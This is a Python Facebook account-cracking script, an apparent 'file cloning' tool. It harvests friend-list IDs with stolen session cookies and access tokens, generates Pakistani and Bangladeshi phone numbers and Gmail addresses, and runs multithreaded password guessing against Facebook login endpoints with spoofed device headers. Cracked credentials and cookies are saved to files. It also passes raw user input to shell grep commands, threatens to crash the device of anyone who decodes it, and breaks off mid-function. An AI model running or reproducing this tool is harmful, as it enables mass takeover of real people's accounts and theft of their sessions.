# Compiled By Mr Mafia | Muhammad Muzammil
# Github  :  https://github.com/Muzammil-404

import base64
exec(base64.b64decode("#assalamowalikom OPEN source by Harry (Haris AKHTAR )
#Fuck YATEEM kid N0M1 tahir 
fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
g1=('A');g2=('K');g3=('I');g4=('N');g5=('G');g6=('1');g7=('1');g8=('0');pr=('-P');pr1=('R');pr2=('O')
ghb=g1+g2+g3+g4+g5+g6+g7+g8
gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
cx=('.g');cxx=('fig');xl=('/')
  
import os,base64
os.system("xdg-open https://www.facebook.com/groups/893149411835087/?ref=share")
u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
rqts=r1+r2+r3+r4+r5+r6+r7+r8
y1=('-');y2=('y');y3=(' > ')
ys=y1+y2+y3
print('\n\033[1;32m install missing modules...\n It will take some seconds...')
os.system(f'pip {ustl} {rqts} {ys}/dev/null')
os.system(f'pip install {rqts}{y3}/dev/null')
try:
	import os,requests,json,time,re,random,sys,uuid,string,subprocess
	from string import *
	import bs4
	#import dz
	from concurrent.futures import ThreadPoolExecutor as tred
	from bs4 import BeautifulSoup as sop
	from bs4 import BeautifulSoup
except ModuleNotFoundError: 
	print('\n Installing missing modules ...')
	os.system('pip install requests bs4 futures==2 > /dev/null')
	os.system('python N0M1.py')
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
	for line in xx:
		android_models.append(line)
except:pass
myid=uuid.uuid4().hex[:5].upper()

usr=[]
try:
	xd=requests.get('https://raw.githubusercontent.com/ahmad77412/DATA-FILE/main/UAGNT').text.splitlines()
	for us in xd:
		usr.append(us)
except: pass
pyt=('python3.11')
pkgz=('packages')
ap1=('a')
ap2=('pi')
ap3=('.p')
api=ap1+ap2+ap3
md1=('mo')
md2=('de')
md3=('ls')
md4=('.p')
mudl=md1+md2+md3+md4
#------------------[ USER-AGENT-DEFAULT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]

for xd in range(10000):
    a='Mozilla/5.0 (Linux; Android 9; ZTE Blade L8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Mozilla/5.0 (Linux; Android 9; ZTE Blade L8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36'
    e=random.randrange(100, 9999)
    f='Mozilla/5.0 (Linux; Android 9; ZTE Blade L8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mozilla/5.0 (Linux; Android 9; ZTE Blade L8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen2.append(uaku)


    aa='Mozilla/5.0 (Linux; Android 9; ZTE Blade L8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36'
    b=random.choice(['2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='Mozilla/5.0 (Linux; Android 11; Infinix X6812) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'
    h=random.randrange(10,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mozilla/5.0 (Linux; Android 9; ZTE Blade L8 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.105 Mobile Safari/537.36'
    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
    ugen.append(uaku2)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Juttking/Trick/blob/main/Trick.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
	 

logo=("""\033[1;32m
\033[1;32m 
┳  ┓ ┏┓┓┏┏┓  ┓┏┏┓┳┳
┃  ┃ ┃┃┃┃┣   ┗┫┃┃┃┃
┻  ┗┛┗┛┗┛┗┛  ┗┛┗┛┗┛
\033[1;93m--------------------------------------------------
\033[1;37m[-] AUTHOR    :\033[1;32m KAVI SL 
\033[1;37m[-] GITHUB    :\033[1;32m KAVI SL
\033[1;37m[-] VERSION   :\033[1;32m 1.0
\033[1;37m[-] STATUS    :\033[1;32m Personal
 DONOT TRY  TO DECODE THEN I CRASH  YOUR MOBILE
--------------------------------------------------
\033[1;37m[-]Dear Paid user:
\033[1;37m[-]Your subscription last date 10/2/23
--------------------------------------------------""")
def linex():
	print('\033[1;32m----------------------------------------------')
def clear():
	os.system('clear')
	print(logo)
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
D = '\x1b[1;92m'
M = '\033[1;31m'
H = '\033[1;32m'
N = '\x1b[1;91m'	
E = '\x1b[1;93m' 
F = '\x1b[1;94m'
G = '\x1b[1;95m'
P = '\033[1;91m'
def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
	else:
		print(f'\r{A} [â€¢]%s Active Apks & Web ðŸ‘‡ '%(H))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
	else:
		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
		for i in range(len(game)):
			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
loop=0
oks=[]
cps=[]
pcp=[]
id=[]
tokenku=[]
try:os.mkdir('data')
except:pass

def public():
	usrr=[]
	try:
		tok = open('data/token','r').read()
		cok = open('data/coki','r').read()
		tokenku.append(tok)
	except IOError:
		print('\033[1;31mYour cookies han expired...');time.sleep(1)
		c_login()
	create()
	time.sleep(1)
	clear()
	try:
		jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;91m '))
	except ValueError:
		exit(' Put only digits not latters ')
	if jum<1 or jum>5000:
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'\033[1;32m Put link no.{yz+0}: ')
		usrr.append(kl)
	
	
	linex()
	print(' [1] STARTCRACKING ')
	linex()
	mthd = input(' Choose method: ')
	linex()
	print(' Do you went show cp account? (y/n): ')
	linex()
	cx=input(' Choose: ')
	if cx in ['y','Y','yes','Yes','1']:
		pcp.append('y')
	else:
		pcp.append('n')
	linex()
	print('\033[1;32m Dumping friend list...\033[1;91m')
	linex()
	for userr in usrr:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			exit(f' No internet connection')
	try:
		plist = []
		try:
			ps_limit = int(input(' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		linex()
		print('\033[1;32m exp: first last,firtslast,first123')
		linex()
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(id))
			
			linex()
			for user in id:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(ffb,ids,names,passlist)
				else:
					crack_submit.submit(mmm,ids,names,passlist)
		print('\033[1;32m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python N0M1.py')
	except requests.exceptions.ConnectionError:
		exit(f' No internet connection')
	except (KeyError,IOError):
		print(f' No friends for {userr}')
		time.sleep(3)
		public()
		
def create_file_login():
    ids = []
    xyz = requests.Session()
    os.system('clear')
    print(logo)
    try:
        cookies = {'cookie':open('fb_cookies.txt','r').read()}
        access_token = open('access_token.txt', 'r').read()
    except FileNotFoundError:
        login()
    try:
        check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
        load = json.loads(check_cookies)
        iid = load['id']
        name = load['name']
    except KeyError:
        print('\n Cookies has expired, login another cookies.')
        time.sleep(1)
        os.system('rm -rf .fb_cookies.txt .access_token.txt')
        login()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    os.system('clear')
    print(logo)
    print(' [1] Create auto file (fast)')
    print(' [2] Create manual file')
    print(50*'-')
    foopt = input(' Choose option: ')
    if foopt =='1':
        auto_file(cookies,access_token)
    else:
        manual_file(cookies,access_token)
def auto_file(cookies,access_token):
    global total
    os.system('clear & rm -rf .txt .temp.txt')
    print(logo)
    print(' File auto creation mode ...')
    print(50*'-')
    print('\033[1;35m Put range between 1 to 20\033[1;97m\n')
    try:
        fl = int(input(' How many ids you want to add? '))
    except:
        fl = 1
    for xd in range(fl):
        idt = input(f' Put id no.{xd+1}: ')
        try:
            fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
            xyz = requests.Session()
            r = xyz.get(fd_url,cookies=cookies).text
            q = json.loads(r)
            for iid in q['friends']['data']:
                uid = iid['id']
                open('.txt','a').write(uid+'\n')
        except KeyError:
            print(' No friends from: '+idt)
        except requests.exceptions.ConnectionError:
            print(' No internet connection ....')
    print('\n\033[1;35m Example: 100086.100087,100088 etc\033[0;97m')
    try:
        sl = int(input('\n How many links do you want to grab? '))
    except:
        sl = 1
    for el in range(sl):
        sid = input(f' Put {el+1} link: ')
        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
    print('\n \033[1;35m /sdcard/N0M1.txt \033[0;97m\n')
    sf = input(' Put path to save file: ')
    file = open('.temp.txt','r').read().splitlines()
    print('')
    print(' Total ids: '+str(len(file)))
    print(' Grabbing process has started')
    print(50*'-')
    with ThreadPool(max_workers=20) as yaari:
        for exid in file:
            yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
    print(50*'-')
    print(' Total ids: '+str(len(total)))
    print('\n')
    input(' Press enter to back ')
    os.system('python N0M1.py')
def iamBadBoy(exid,cookies,access_token,sf):
    try:
        global total,loop
        fd_url = 'https://b-graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
        xyz = requests.Session()
        r = xyz.get(fd_url,cookies=cookies).text
        q = json.loads(r)
        for yaad in q['friends']['data']:
            iid = yaad['id']
            name = yaad['name']
            total.append(iid)
            open(sf,'a').write(iid+'|'+name+'\n')
        loop+=1
        sys.stdout.write('\r %s | Total ids: %s\r'%(loop,len(total)));sys.stdout.flush()
    except requests.exceptions.ConnectionError:
        print(' No internet connection ...')
    except KeyError:
        pass
def manual_file(cookies,access_token):
    ids=[]
    os.system('clear')
    print(logo)
    try:
        limit = int(input(' How many ids do you want to extract? '))
    except:
        limit = 1
    print('\n \033[1;32mExample: /sdcard/N0M1.txt \033[0;97m\n')
    sf = input(' Save file as: ')
    print(50*'-')
    for xd in range(limit):
        idt = input(f' Put id no {xd+1}: ')
        try:
            xyz=requests.Session()
            friend_list = xyz.get('https://b-graph.facebook.com/'+idt+'?fields=friends.fields(id,name)&access_token='+access_token,cookies=cookies).text
            lists = json.loads(friend_list)
            for i in lists['friends']['data']:
                iid = i['id']
                name = i['name']
                ids.append(iid)
                open(sf,'a').write(iid+'|'+name+'\n')
        except KeyError:
            print(' No friends found ...\n')
        except requests.exceptions.ConnectionError:
            print(' No internet connection ...\n')
        except KeyboardInterrupt:
            print('Skipping ...\n')
    print(50*'-')
    print(' Total ids grabbed: '+str(len(ids)))
    print(' Ids file saved in: '+sf)
    input(' \nPress enter to back ')
    os.system('python N0M1.py')
def sids():
    os.system('clear')
    print(logo)
    try:
        file_name = input(' Input file name: ')
        open(file_name,'r').read()
    except FileNotFoundError:
        print(' File not found.')
        exit()
    print('\n\033[1;32m Put limit between 1 to 10 \033[0;97m')
    limit = int(input(' How many links do you want to separate? '))
    print('\n\033[1;32m Example: /sdcard/N0M1.txt\033[0;97m')
    new_save = input(' Save new file as: ')
    print('')
    y = 0
    for k in range(limit):
        y+=1
        links = input(' Put links %s: '%(y))
        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
    print(50*'-')
    print(' Links grabbed successfully')
    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
    print(' New file saved as: '+new_save)
    print(50*'-')
    input('\n Press enter to back ')
    os.system('python N0M1.py')
def remove_dub():
    os.system('clear')
    print(logo)
    print(50*'-')
    user_file = input(' Put file path: ')
    try:
        open(user_file,'r').read()
        print(' \n\033[1;32mExample: /sdcard/filename.txt\n\033[0;97m')
        save_file = input(' Save new file as: ')
        os.system('touch '+save_file)
        os.system('sort -r '+user_file+' | uniq > '+save_file)
        print(50*'-')
        print(' Dublicate lines has been removed from file')
        print(' Result file saved as: '+save_file)
        print(50*'-')
        input('\n Press enter to back ')
        os.system('python N0M1.py')
    except FileNotFoundError:
        print(' File not found.')
def login():
    os.system('clear')
    print(logo)
    print('\n\033[1;32m If you donot know how to get cookies, watch video on YouTube \033[0;97m')
    cookies = input(' Put cookies here: ')
    try:
        print('\n Validating cookies ... ')
        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
        find_token = re.search("(EAAG\w+)", data.text)
        open("access_token.txt", "w").write(find_token.group(1))
        open("fb_cookies.txt","w").write(cookies)
        print(' Logged in successfully ...')
        time.sleep(1)
        os.system('python N0M1.py')
    except KeyError:
        print('\n Inavlid cookies, try another cookies')
        exit()
    except requests.exceptions.ConnectionError:
        print('\n No internet connection ...')
        exit()
    except AttributeError:
        print('\n Invalid cookies, try another cookies ...')
        exit()
def menu(): 
	os.system('clear')
	print(logo)
	print(' [1] File cloning\n [0] Exit menu')
	linex()
	xd=input(' Choose an option: ')
	if xd in ['1','01']:
		clear()
				
		linex()
		file = input(' Put file path\033[1;91m: ')
		try:
			fo = open(file,'r').read().splitlines()
		except FileNotFoundError:
			print(' File location not found ')
			time.sleep(1)
			menu()
		clear()
				
		linex()
		print(' [1] START CRACKING')
		linex()
		mthd=input(' Choose: ')
		linex()
		plist = []
		try:
			ps_limit = int(input(' How many passwords do you want to add ? '))
		except:
			ps_limit =1
		linex()
				
		linex()
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		linex()
		print(' Do you went show cp account? (y/n): ')
		linex()
		cx=input(' Choose: ')
		if cx in ['y','Y','yes','Yes','1']:
			pcp.append('y')
		else:
			pcp.append('n')
		with tred(max_workers=30) as crack_submit:
			clear()
			total_ids = str(len(fo))
					
			linex()
			for user in fo:
				ids,names = user.split('|')
				passlist = plist
				if mthd in ['1','01']:
					crack_submit.submit(ffb,ids,names,passlist)
				elif mthd in ['2','02']:
					crack_submit.submit(mmm,ids,names,passlist)
				else:
					crack_submit.submit(api,ids,names,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python N0M1.py')
	elif xd in ['2','02']:
		create_file_login()
	elif xd in ['3','03']:
		public()
	elif xd in ['4','04']:
		clear()
		print(' [1] Pakistan cloning\n [2] Bangladesh cloning\n [3] gmail cloning\n [0] Back menu')
		linex()
		x=input(' Choose: ')
		if x in ['1','01']:
			pak()
		elif x in ['2','02']:
			bd()
		elif x in ['3','03']:
			gmail()
		else:
			menu()
			
	elif xd in ['5','05']:
	   gmail()
	elif xd in ['6','06']:
	    sids()
	elif xd in ['7','07']:
		remove_dub()
	elif xd in ['8','08']:
		os.system('rm -rf fb_cookies.txt')
	elif xd in ['9','09']:
		os.system(f'xdg-open https://wa.me/+923231243823');menu()
			
	elif xd in ['0','00']:
		exit(' KHUDA HAFIZ ')
	else:
		exit(' Option not found in menu...')
		
def pak():
		user=[]
		clear()
		print('\033[1;31m Code example: 0306,0315,0335,0345')
		code = input('\033[1;32m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 Best ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' [1] Clone with 7+11 digit pass (v-fast)\n [2] Clone with auto pass (fast)\n [3] Clone with auto pass v2 (slow-best) ')
		linex()
		pcs = input(' [?] Select: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(7))
			user.append(nmp)
		with tred(max_workers=30) as AXI:	
			clear()
			tl = str(len(user))
			print(' Total idz : \033[1;32m'+tl+f' ')
			print(f'\033[1;32m Your selected code ..:\033[1;32m '+code)
			print(f'\033[1;32m \x1b[38;5;208mif you Show no result use flight mode\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids]
				elif pcs in ['2','02']:
					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234']
				else:
					passlist = [psx,ids,'khankhan','khan1122','Ali786','khan1234','Ali123','ali786','khan123','khan12345']
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python N0M1.py')
def bd():
		user=[]
		clear()
		print('\033[1;32m Code example: 016,017,018,019')
		code = input('\033[1;32m put code: ')
		try:
			limit = int(input('\033[1;32m example: 2000, 3000, 5000, 10000\n\033[1;91m put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		for nmbr in range(limit):
			nmp = ''.join(random.choice(string.digits) for _ in range(8))
			user.append(nmp)
		with tred(max_workers=30) as AXI:	
			clear()
			tl = str(len(user))
			print(' Total idz : \033[1;32m'+tl+f' ')
			print(f'\033[1;32m Choice code ..:\033[1;32m '+code)
			print(f'\033[1;32m \x1b[38;5;208mUse flight mode for best result\033[1;97m')
			linex()
			for psx in user:
				ids = code+psx
				passlist = [psx,ids]
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;91m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python N0M1.py')
def gmail():
		os.system('rm -rf .re.txt')
		clear()
		print('\033[1;32m example: muhammad, ali, sajjad, faizan , N0M1\033[1;97m')
		linex()
		first = input(' Put first name: ')
		linex()
		print('\033[1;32m example: khan, ahmad, ali \033[1;97m')
		linex()
		last = input(' Put last name: ')
		linex()
		print(' Example: @gmail.com , @yahoo.com etc...')
		linex()
		domain = input(' domain: ')
		linex()
		try:
			limit=int(input(' Put limit: '))
		except ValueError:
			limit = 5000
		linex()
		print(' [1] Only name password \n [2] name + digit password \n [3] Capital name password\n [4] Auto all password')
		linex()
		pxc = input(' Choose : ')
		linex()
		print(' [1] Method 1\n [2] Method 2 ')
		linex()
		mthd = input(' Choose: ')
		linex()
		print(' Getting gmails...')
		lists = ['3','4']
		for xd in range(limit):
			lchoice = random.choice(lists)
			if '3' in lchoice:
				mail = ''.join(random.choice(string.digits) for _ in range(3))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			else:
				mail = ''.join(random.choice(string.digits) for _ in range(4))
				open('.re.txt','a').write(first.lower()+last.lower()+mail+domain+'|'+first+' '+last+'\n')
			fo = open('.re.txt', 'r').read().splitlines()
		with tred(max_workers=30) as AXI:
			total = str(len(fo))
			clear()
			print(' Total idz : \033[1;32m'+total+f' ')
			print("\033[1;91m \x1b[38;5;208mUse flight mode for Best result\033[1;91m")
			linex()
			for user in fo:
				ids,names = user.split('|')
				first_name = names.rsplit(' ')[0]
				try:
					last_name = names.rsplit(' ')[1]
				except IndexError:
					last_name = 'Khan'
				fs = first_name.lower()
				ls = last_name.lower()
				if pxc in ['1','01']:
					passlist = [fs+ls,fs+' '+ls,fs]
				elif pxc in ['2','02']:
					passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122']
				elif pxc in ['3','03']:
					passlist = [first_name+last_name,first_name+' '+last_name,first_name+'123']
				else:
					passlist = [fs+ls,fs+' '+ls,first_name+last_name,first_name+' '+last_name,fs+'123',fs+'786',fs+'12345',fs+'1122']
				if mthd in ['1','01']:
					AXI.submit(rcrack1,ids,passlist)
				else:
					AXI.submit(rcrack,ids,passlist)
		print('\033[1;90m')
		linex()
		print(' The process has completed')
		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
		linex()
		input(' Press enter to back ')
		os.system('python N0M1.py')

def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;32m [KING SL] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
			last = names.split(' ')[1]
		except:
			last = 'Khan'
		ps = first.lower()
		ps2 = last.lower()
		for fikr in passlist:
			pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
			ua=random.choice(ugen)
			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
			getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
			AXI=session.cookies.get_dict().keys()
			if "c_user" in AXI:
				coki=session.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
				print('\r\r\033[1;32m [Successful] %s | %s'%(ids,pas))
				open('/sdcard/KAVISL-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in AXI:
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m [Checkpoint] '+ids+' | '+pas+'\033[1;97m')
					open('/sdcard/N0M1-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
			else:
				continue
	except requests.exceptions.ConnectionError:
		time.sleep(20)
	loop+=1

def rcrack1(ids,passlist):
	global loop
	global oks
	try:
		for pas in passlist:
			sys.stdout.write('\r\r\033[1;32m [PRO-CHRISE] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
			application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
			application_version_code=str(random.randint(000000000,999999999))
			__iam_genius = random.choice(android_models)
			phone_model = __iam_genius.split('|')[0]
			phone_company = __iam_genius.split('|')[1]
			dimensions = __iam_genius.split('|')[2]
			ffb=random.choice(fbks)
			dvlk = random.choice(usr)
			ua=random.choice(ugen)
			ua_string = f'{str(dvlk)} [FBAN/FB4A;FBAV/{str(application_version)};FBPN/com.facebook.katana;FBLC/en_PK;FBCR/null;FBBV/{str(application_version_code)};FBMF/{str(phone_company)};FBBD/{str(phone_company)};FBDV/{str(phone_company)};FBSV/11;;FBDM/'+'{density=3.0,height=360,width=800};]'
			li = ['28','29','210']
			li2 = random.choice(li)
			j1 = ''.join(random.choice(digits) for _ in range(2))
			j2 = li2+j1
			device_family_id = str(uuid.uuid4())
			adid = str(uuid.uuid4())
			machine_id = ''.join(random.choice(ascii_uppercase+ascii_lowercase+digits+'_') for _ in range(24))
			data = {'adid': 'f4c7f138-522e-4743-b57f-f5dd35054638', 'format': 'json', 'device_id': '50aa54ca-53e5-4cb5-9632-85657d3fe208', 'cpl': 'true', 'family_device_id': '4d995796-6ecf-4e78-bcee-2c795cd1863e', 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'register_api', 'email': '61550578640768', 'password': 'nitesh786', 'access_token': '256002347743983|374e60f8b9bb6b8cbb30f78030438895', 'generate_session_cookies': '1', 'meta_inf_fbmeta': 'NO_FILE', 'advertiser_id': '0959a3d8-9eff-4e26-9ed8-aa4457763cde', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'api_key': '882a8490361da98702bf97a021ddc14d'}
			head ={'User-Agent': '[FBAN/FB4A;FBAV/400.0.0.37.76;FBBV/443234908;FBDM/{density=2.8125,width=1080,height=2131};FBLC/en_US;FBRV/444474383;FBCR/Telstra;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-S906E;FBSV/13;FBOP/1;FBCA/arm64-v8a;]', 'Accept-Encoding': 'gzip, deflate', 'Connection': 'keep-alive', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': '34400558', 'X-FB-SIM-HNI': '34103', 'X-FB-Connection-Type': 'MOBILE.LTE', 'Authorization': 'OAuth 256002347743983|374e60f8b9bb6b8cbb30f78030438895', 'X-FB-Connection-Quality': 'MOBILE.LTE', 'X-FB-Connection-Bandwidth': '30032935', 'X-Tigon-Is-Retry': 'False', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
			url = 'https://b-api.facebook.com/method/auth.login'
			po = requests.post(url,data=data,headers=head,allow_redirects=False).text
			q = json.loads(po)
			if 'session_key' in q:
				udx = str(q['uid'])
				print('\r\r\033[1;32m [Successful] '+udx+' | '+pas+'\033[1;97m')
				open('/sdcard/KAVISL-OK.txt', 'a').write(udx+'|'+pas+'|'+kuki+'\n')
				oks.append(ids)
				break
			elif 'www.facebook.com' in q['error_msg']:
